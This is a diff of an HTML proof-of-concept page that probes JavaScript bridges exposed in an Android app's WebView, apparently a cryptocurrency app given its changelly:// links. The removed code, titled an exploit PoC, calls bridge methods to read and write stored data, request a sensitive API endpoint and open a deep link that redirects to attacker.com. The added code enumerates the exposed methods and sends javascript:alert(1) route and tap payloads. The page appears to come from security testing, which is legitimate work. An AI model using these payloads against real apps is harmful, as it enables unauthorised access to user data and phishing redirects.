@@ -1,6 +1,6 @@
 <html>
 <head>
-    <title>WebView JavaScript Interface Testing</title>
+    <title>WebView Interface Testing</title>
     <style>
         .button {
             margin: 10px;
@@ -16,95 +16,121 @@
             padding: 10px;
             border: 1px solid #ccc;
             min-height: 100px;
+            font-family: monospace;
         }
+        .error { color: red; }
+        .success { color: green; }
     </style>
 </head>
 <body>
-    <h2>GameJSInterface Exploit PoC</h2>
+    <h2>WebView Interface Testing</h2>
     
-    <h3>Data Storage/Retrieval:</h3>
-    <button class="button" onclick="getStoredData()">Get Game Instance Data</button>
-    <button class="button" onclick="setStoredData()">Set Game Instance Data</button>
+    <h3>Game Interface Tests:</h3>
+    <button class="button" onclick="checkInterfaces()">Check Available Interfaces</button>
+    <button class="button" onclick="testGameInterface()">Test Game Interface</button>
     
-    <h3>Game Control:</h3>
-    <button class="button" onclick="triggerGameComplete()">Trigger Game Complete</button>
-    <button class="button" onclick="sendCustomEvent()">Send Custom Event</button>
-    
-    <h3>System Access:</h3>
-    <button class="button" onclick="triggerVibration()">Trigger Vibration</button>
-    <button class="button" onclick="sendApiRequest()">Send API Request</button>
-    <button class="button" onclick="openCustomURL()">Open URL</button>
-    
+    <h3>Engine Interface Tests:</h3>
+    <button class="button" onclick="testRouteChange()">Test Route Change</button>
+    <button class="button" onclick="testTapAction()">Test Tap Action</button>
+    <button class="button" onclick="testSizeChange()">Test Size Change</button>
+    <button class="button" onclick="testError()">Test Error</button>
+
     <h3>Output:</h3>
     <div id="output"></div>
 
     <script>
-        function log(message) {
-            document.getElementById('output').innerHTML += message + '<br>';
+        const possibleInterfaces = [
+            'GameJSInterface',
+            'EngineWebViewInterface',
+            'Android',
+            'game'
+        ];
+
+        function log(message, isError = false) {
+            const output = document.getElementById('output');
+            output.innerHTML = `<div class="${isError ? 'error' : 'success'}">${new Date().toLocaleTimeString()} - ${message}</div>` + output.innerHTML;
         }
 
-        function getStoredData() {
+        function checkInterfaces() {
+            log("Checking available interfaces...");
+            possibleInterfaces.forEach(interfaceName => {
+                if (window[interfaceName]) {
+                    log(`Found interface: ${interfaceName}`, false);
+                    for(let prop in window[interfaceName]) {
+                        log(`- Method: ${prop}`, false);
+                    }
+                }
+            });
+        }
+
+        function testGameInterface() {
             try {
-                const data = window.GameJSInterface.gameInstanceGetLocalData("test_id");
-                log("Retrieved Data: " + data);
+                if (window.GameJSInterface) {
+                    window.GameJSInterface.sendApiRequest('{"test": "payload"}');
+                    window.GameJSInterface.event("test_event", "test_data");
+                    log("Game interface tests sent");
+                } else {
+                    log("GameJSInterface not found", true);
+                }
             } catch(e) {
-                log("Error: " + e);
+                log(`Error in game interface: ${e.message}`, true);
             }
         }
 
-        function setStoredData() {
+        // Engine Interface Tests
+        function sendEngineMessage(method, params) {
             try {
-                window.GameJSInterface.gameInstanceSetLocalData("test_id", "sensitive_data", true);
-                log("Data stored successfully");
+                const message = {
+                    gist: {
+                        method: method,
+                        parameters: params
+                    }
+                };
+                
+                if (window.EngineWebViewInterface) {
+                    window.EngineWebViewInterface.postMessage(JSON.stringify(message));
+                    log(`Sent ${method} message`);
+                } else {
+                    log("EngineWebViewInterface not found", true);
+                }
             } catch(e) {
-                log("Error: " + e);
+                log(`Error sending ${method}: ${e.message}`, true);
             }
         }
 
-        function triggerGameComplete() {
-            try {
-                window.GameJSInterface.gameComplete("TEST", "malicious_payload", "changelly://changelly.com/webview?link=https://attacker.com");
-                log("Game complete triggered with malicious payload");
-            } catch(e) {
-                log("Error: " + e);
-            }
+        function testRouteChange() {
+            sendEngineMessage("routeChanged", {
+                "route": "javascript://alert(1)"
+            });
         }
 
-        function sendCustomEvent() {
-            try {
-                window.GameJSInterface.event("custom_event", "{\"type\":\"malicious\",\"payload\":\"test\"}");
-                log("Custom event sent");
-            } catch(e) {
-                log("Error: " + e);
-            }
+        function testTapAction() {
+            sendEngineMessage("tap", {
+                "name": "test_tap",
+                "action": "javascript:alert(1)",
+                "system": true
+            });
         }
 
-        function triggerVibration() {
-            try {
-                window.GameJSInterface.vibrate([1000, 1000, 1000]);
-                log("Vibration triggered");
-            } catch(e) {
-                log("Error: " + e);
-            }
+        function testSizeChange() {
+            sendEngineMessage("sizeChanged", {
+                "width": 1337,
+                "height": 1337
+            });
         }
 
-        function sendApiRequest() {
-            try {
-                window.GameJSInterface.sendApiRequest("{\"endpoint\":\"/api/sensitive\",\"method\":\"GET\"}");
-                log("API request sent");
-            } catch(e) {
-                log("Error: " + e);
-            }
+        function testError() {
+            sendEngineMessage("error", {});
+            sendEngineMessage("routeError", {
+                "route": "javascript:alert(1)"
+            });
         }
 
-        function openCustomURL() {
-            try {
-                window.GameJSInterface.openUrl("changelly://changelly.com/webview?link=https://attacker.com");
-                log("URL opened");
-            } catch(e) {
-                log("Error: " + e);
-            }
-        }
+        // Run interface check on page load
+        window.onload = function() {
+            checkInterfaces();
+            log("Page loaded successfully");
+        };
     </script>
 </body>
 </html>
